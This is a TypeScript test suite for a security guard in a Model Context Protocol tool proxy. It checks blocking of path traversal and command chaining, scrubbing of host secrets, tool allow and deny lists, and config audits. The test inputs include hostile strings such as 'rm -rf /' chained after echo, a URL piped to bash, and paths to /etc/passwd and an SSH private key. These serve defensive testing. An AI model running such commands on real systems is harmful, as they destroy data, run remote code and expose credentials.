/**
 * Security Guard & Sandboxing Tests
 * Validates mitigations against MCPoison, CurXecute, and path traversal.
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { SecurityGuard } from '../src/security.js';
import { MCPTool, MCPServerConfig } from '../src/types.js';

describe('MCP Security Guard & Sandbox Tests', () => {
  const guard = new SecurityGuard();

  it('1. should block path traversal attacks in arguments', () => {
    assert.throws(
      () => {
        guard.validateToolExecution('read_file', { path: '../../etc/passwd' });
      },
      /Security Violation: Suspicious path traversal/
    );

    assert.throws(
      () => {
        guard.validateToolExecution('read_file', { path: 'C:\\test_account\\..\\..\\.ssh\\id_rsa' });
      },
      /Security Violation: Suspicious path traversal/
    );
  });

  it('2. should block command chaining and reverse shell injection patterns', () => {
    assert.throws(
      () => {
        guard.validateToolExecution('exec_cmd', { command: 'echo hello; rm -rf /' });
      },
      /Security Violation: Dangerous command chaining/
    );

    assert.throws(
      () => {
        guard.validateToolExecution('curl_tool', { url: 'http://test.com | bash' });
      },
      /Security Violation: Dangerous command chaining/
    );
  });

  it('3. should scrub sensitive environment variables from host while preserving configured server keys', () => {
    const hostEnv = {
      PATH: '/usr/bin',
      OPENAI_API_KEY: 'sk-proj-super-secret-key-12345',
      AWS_SECRET_ACCESS_KEY: 'aws-secret-system-key',
      APP_MODE: 'production',
    };
    const serverExplicitEnv = {
      GITHUB_TOKEN: 'ghp_legitimate_token_for_this_server',
    };

    const scrubbed = guard.scrubEnvironment(hostEnv, serverExplicitEnv);
    assert.equal(scrubbed.PATH, '/usr/bin');
    assert.equal(scrubbed.APP_MODE, 'production');
    assert.equal(scrubbed.OPENAI_API_KEY, undefined, 'Host OpenAI key must NOT leak to upstream');
    assert.equal(scrubbed.AWS_SECRET_ACCESS_KEY, undefined, 'Host AWS secret must NOT leak to upstream');
    assert.equal(scrubbed.GITHUB_TOKEN, 'ghp_legitimate_token_for_this_server', 'Explicit server key must be preserved');
  });

  it('4. should enforce tool allowlist and denylist', () => {
    const serverConfig: MCPServerConfig = {
      name: 'restricted-server',
      command: 'test',
      security: {
        allowTools: ['allowed_tool_1'],
        denyTools: ['forbidden_tool'],
      },
    };

    // Allowed tool passes
    assert.doesNotThrow(() => {
      guard.validateToolExecution('allowed_tool_1', {}, serverConfig);
    });

    // Denied tool throws
    assert.throws(() => {
      guard.validateToolExecution('forbidden_tool', {}, serverConfig);
    }, /is in the server denylist/);

    // Non-allowed tool throws
    assert.throws(() => {
      guard.validateToolExecution('other_unlisted_tool', {}, serverConfig);
    }, /is not permitted by allowlist/);
  });

  it('5. should calculate deterministic SHA-256 config checksums', () => {
    const config1 = { a: 1, b: 2 };
    const config2 = { b: 2, a: 1 };
    const hash1 = SecurityGuard.calculateConfigChecksum(config1);
    const hash2 = SecurityGuard.calculateConfigChecksum(config2);
    assert.equal(hash1, hash2, 'Checksums should be deterministic regardless of key order');
  });

  it('6. should flag high-risk configurations in security audit report', () => {
    const servers: Record<string, MCPServerConfig> = {
      insecure_server: {
        name: 'insecure_server',
        command: 'bash', // shell wrapper
        env: { STRIPE_SECRET_KEY: 'sk_live_123' },
      },
    };

    const tools: MCPTool[] = [
      {
        name: 'eval_arbitrary_code',
        description: 'Runs dynamic code evaluation on host system',
        inputSchema: { type: 'object' },
      },
    ];

    const report = guard.auditConfiguration(servers, tools);
    assert.ok(report.issues.length >= 2, 'Should detect shell wrapper and arbitrary code eval');
    assert.ok(report.score < 80, 'Health score should be penalized for high risks');
    assert.equal(report.passed, false);
  });
});
